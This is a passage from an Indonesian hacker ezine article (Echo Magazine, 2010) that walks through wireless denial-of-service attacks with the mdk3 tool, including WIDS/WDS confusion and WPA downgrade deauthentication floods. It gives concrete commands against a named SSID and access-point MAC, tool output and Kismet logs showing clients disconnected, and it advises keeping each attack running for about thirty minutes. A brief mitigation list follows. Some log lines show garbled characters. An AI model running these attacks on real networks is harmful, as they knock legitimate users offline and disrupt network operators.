+Device is still responding with 320000 clients connected!
+
+Hasil Penyerangan yang dipantau Kismet Console :
++-----------------------------------------------------------------------------+
+ ÁãΩINFO: Detected new probe network "<Any>", BSSID 00:26:CC:43:E5:0B,           
+ÁãΩ      encryption no, channel 0, 54.00 mbit                                  
+ÁãΩINFO: Kismet server accepted connection from 127.0.0.1                      
+ÁãΩINFO: Detected new probe network "<Any>", BSSID 00:17:C4:78:D1:4B,           
+ÁãΩ      encryption no, channel 0, 54.00 mbit                                   
+ÁãΩINFO: Detected new probe network "<Any>", BSSID 00:26:69:24:3A:92,           
+ÁãΩ      encryption no, channel 0, 54.00 mbit                                   
+ÁãΩINFO: Detected new probe network "BinaInsani_FreeHotSpotPremium", BSSID 00:  
+ÁãΩ      26:5E:75:62:F7, encryption no, channel 0, 54.00 mbit                   
+ÁãΩINFO: Saved data files                                                       
+ÁãΩINFO: Detected new probe network "<Any>", BSSID E4:EC:10:7F:34:F9,           
+ÁãΩ      encryption no, channel 0, 54.00 mbit                                   
+ÁãΩINFO: Detected new probe network "<Any>", BSSID 00:1E:64:32:A8:78,           
+ÁãΩ      encryption no, channel 0, 54.00 mbit                                   
+ÁãΩINFO: Found IP range 192.168.5.22/255.255.255.254 for network                
+ÁãΩ      00:1E:C1:AB:35:9B                                                      
+ÁãΩINFO: Detected new probe network "b71baru", BSSID 30:69:4B:DF:1E:D2,         
+ÁãΩ      encryption no, channel 0, 54.00 mbit                                   
+ÁãΩINFO: Detected new probe network "<Any>", BSSID 00:26:82:00:95:27,           
+ÁãΩ      encryption no, channel 0, 54.00 mbit   
++------------------------------------------------------------------------------+                               
+* Lakukan teknik penyerangan ini selama kurang lebih 30 menit saja, traffic
+koneksi terhenti...koneksi terhenti...koneksi putus...putus....
+Kismet Monitor pun hanya terdiam dan tidak mampu melakukan monitoring... Now,
+say "bye...bye...AP lol"
+
++----------------------------------------------------+
+| Penyerangan : WIDS/WIPS/WDS Confusion              |
++----------------------------------------------------+
+
+command : ./mdk3 <wifi_interface> w -e <ssid_target> -c <channel_AP> -z
+
+. lakukan penyerangan pada 2 console :
+
+console 1 :
+root@bt:/pentest/wireless/mdk3# ./mdk3 wlan1 w -e Hack_Me -c 11 -z
+
+console 2 :
+root@bt:/pentest/wireless/mdk3# ./mdk3 wlan2 w -e Hack_Me -c 11 -z
+
+Hasil :
+
+Waiting 10 seconds for initialization...
+Found AP: 00:25:9C:C1:30:0E on channel 11
+Found Client: FF:FF:FF:FF:FF:FF on AP 00:25:9C:C1:30:0E
+Found Client: 01:00:5E:00:00:FB on AP 00:25:9C:C1:30:0E
+
+* Lakukan teknik penyerangan ini selama kurang lebih 30 menit saja, maka
+wireless yang diset sebagai WDS akan mangalamai "Chaos".
+
++----------------------------------------------+
+| Penyerangan : WPA Downgrade Test             |
++----------------------------------------------+
+* pengertian WPA downgrade disini bukan berarti menurunkan ekripsi WPA ke WEP
+loh...;)
+
+command : ./mdk3 <wifi_interface> g -t <mac_address_ap_target>
+
+. lakukan penyerangan pada 2 console :
+
+console 1 :
+root@bt:/pentest/wireless/mdk3# ./mdk3 wlan1 g -t 00:25:9C:C1:30:0E
+
+console 2 :
+root@bt:/pentest/wireless/mdk3# ./mdk3 wlan2 g -t 00:25:9C:C1:30:0E
+
+Hasil :
+
+s:   67  Beacons/sec:   6
+Deauth cycles:  100  802.1x authentication packets:    0  WEP/Unencrypted packets:   67  Beacons/sec:   3
+Deauth cycles:  100  802.1x authentication packets:    0  WEP/Unencrypted packets:   67  Beacons/sec:   3
+Deauth cycles:  100  802.1x authentication packets:    0  WEP/Unencrypted packets:   67  Beacons/sec:   5
+Deauth cycles:  100  802.1x authentication packets:    0  WEP/Unencrypted packets:   67  Beacons/sec:   3
+Deauth cycles:  100  802.1x authentication packets:    0  WEP/Unencrypted packets:   67  Beacons/sec:   4
+Deauth cycles:  100  802.1x authentication packets:    0  WEP/Unencrypted packets:   67  Beacons/sec:   5
+Deauth cycles:  100  802.1x authentication packets:    0  WEP/Unencrypted packets:   67  Beacons/sec:   4
+Deauth cycles:  100  802.1x authentication packets:    0  WEP/Unencrypted packets:   67  Beacons/sec:   6
+Deauth cycles:  100  802.1x authentication packets:    0  WEP/Unencrypted packets:   67  Beacons/sec:   1
+-
+-
+-
+Deauth cycles:  100  802.1x authentication packets:    0  WEP/Unencrypted packets:   67  Beacons/sec:   4
+Deauth cycles:  100  802.1x authentication packets:    0  WEP/Unencrypted packets:   67  Beacons/sec:   4
+Deauth cycles:  100  802.1x authentication packets:    0  WEP/Unencrypted packets:   67  Beacons/sec:   5
+Deauth cycles:  100  802.1x authentication packets:    0  WEP/Unencrypted packets:   67  Beacons/sec:   0
+NOTICE: Did not receive any beacons! Maybe AP has been reconfigured and/or is rebooting!
+Packets sent:    432 - Speed:    0 packets/sec
+
+Hasil Penyerangan yang dipantau Kismet Console :
++-------------------------------------------------------------------------------+
+Ê•≥Á¨è Á¨è Á¨è Á¨è Á¨è Á¨è Á¨è Á¨è Á¨è Á¨è Á¨è Á¨è Á¨è Á¨è Á¨è Á¨è Á¨è Á¨è Á¨è Á¨èÔøΩ
+ÁãΩINFO: Detected new probe network "<Any>", BSSID 00:1E:64:32:A8:78,           
+ÁãΩ      encryption no, channel 0, 54.00 mbit                                  
+ÁãΩINFO: Found IP range 192.168.5.22/255.255.255.254 for network                
+ÁãΩ      00:1E:C1:AB:35:9B                                                      
+ÁãΩINFO: Detected new probe network "b71baru", BSSID 30:69:4B:DF:1E:D2,         
+ÁãΩ      encryption no, channel 0, 54.00 mbit                                   
+ÁãΩINFO: Detected new probe network "<Any>", BSSID 00:26:82:00:95:27,           
+ÁãΩ      encryption no, channel 0, 54.00 mbit                                   
+ÁãΩINFO: Saved data files                                                       
+ÁãΩINFO: Saved data files                                                       
+ÁãΩALERT: BCASTDISCON Network BSSID 00:25:9C:C1:30:0E broadcast deauthenticate  
+ÁãΩ       /disassociation of all clients, possible DoS                          
+ÁãΩINFO: Saved data files                                                       
+ÁãΩALERT: BCASTDISCON Network BSSID 00:25:9C:C1:30:0E broadcast deauthenticate  
+ÁãΩ       /disassociation of all clients, possible DoS                          
+ÁãΩALERT: BCASTDISCON Network BSSID 00:25:9C:C1:30:0E broadcast deauthenticate  
+ÁãΩ       /disassociation of all clients, possible DoS                          
+ÁãΩALERT: BCASTDISCON Network BSSID 00:25:9C:C1:30:0E broadcast deauthenticate  
+ÁãΩ       /disassociation of all clients, possible DoS                          
+ÁãΩINFO: Saved data files                                                       
+ÁãΩ                                                                             
++--------------------------------------------------------------------------------+
+                            
+* Lakukan teknik penyerangan ini selama kurang lebih 30 menit saja, Posible DoS !!!!!!!
+
+-----[ Penanganan :
+. Gunakan Wireless IDS, Wireless IPS
+. Manfaatkan aplikasi AP monitoring utk pemantauan AP
+. Dirikan beberapa Fake AP untuk mengacaukan target sebenarnya
+. Hidden Your SSID, sekalipun Kismet bisa menembusnya....lol
+
+Akhirnya selesai juga menulis tindak kejahatan pada wireless kali ini... semoga
+tidak menjadi bahan kotor buat otak Anda... buang saja tulisan ini jika merasa
+tidak bermanfaat dalam kehidupan Anda.  Sungguh... sejahat2nya ilmu tetaplah
+ilmu..... semoga bisa menjadi kebaikan....
+
+salam,
+Lirva32
+
+-----[ Greetz :
+
+. Echo|Staff 
+. Ibunda tercinta... tanpa perjuangan bunda aku tidak akan bisa seperti
+  sekarang ini...thx bunda...;) 
+. MyDaughter : Faiza Debian dan Fivana Gutsy, smoga kalian mencintai dunia ayah
+  yg seperti ini...:) 
+. "V" kumaha eneng...damang...????  
+. kang Arif s4kitj1wa, Flexus, SheraYusuf, etc
+. Asistenku : Rouda, Roso n Rahmad... thx for everythings.....
+. AllMyStudent@STMIK Bina Insani : kalian bisa menjadi apa yang kalian
+  inginkan..belajarlah..!!!  
+. MyAlmamater : FTI_Univ_Budi_Luhur
+. semua teman2 yang tidak bisa saya sebutkan...terima kasih...;)
+. komunitas Lock Picking Indonesia....thx for sharing about Lock Picking....;)
+
+		+---------------------------------------------------------+
+		| ECHO MAGAZINE VOLUME VIII, ISSUE XXIII, PHILE 0x012.TXT |
+		+---------------------------------------------------------+
+		| 	31 DESEMBER 2010 | http://ezine.echo.or.id        |
+		+---------------------------------------------------------+
